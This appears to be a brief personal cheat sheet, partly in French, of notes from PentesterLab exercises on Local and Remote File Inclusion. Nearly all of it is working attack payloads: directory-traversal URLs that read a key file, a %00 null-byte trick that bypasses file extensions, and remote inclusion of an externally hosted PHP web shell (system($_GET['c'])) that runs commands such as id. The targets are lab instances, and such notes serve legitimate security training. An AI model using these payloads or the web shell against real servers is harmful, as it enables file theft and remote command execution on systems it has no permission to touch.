# LFI : Local file Inclusion


https://highon.coffee/blog/lfi-cheat-sheet/



## Dotdotpwn

## Fimap


## Dir Traversal
Put as many ../../../../../, you stay at /


Check local directory as begin of url
http://ptl-0d8845c8-0b63b08f.libcurl.so/file.php?file=/var/www/../../../../../pentesterlab.key

Bypass extension by adding %00 at the end (work for php<5.3.4)
http://ptl-ded93138-2771189a.libcurl.so/file.php?file=../../../../../../pentesterlab.key%00

Use php include() to do external url include
http://ptl-08a17b2b-81673f5e.libcurl.so/?page=https://assets.pentesterlab.com/test_include_system.txt&c=id
Avec sur un serveur ce code dispo 
<?php 
  system($_GET['c']);
?>

PAge utile : https://assets.pentesterlab.com/test_include_system.txt?c=uname
Le ? devient un & en sous url

Php include() avec ajout de suffixe .php, on supprime le suffixe avec un %00
http://ptl-f93fe94d-4bfe7663.libcurl.so/?page=https://assets.pentesterlab.com/test_include_system.txt%00&c=id

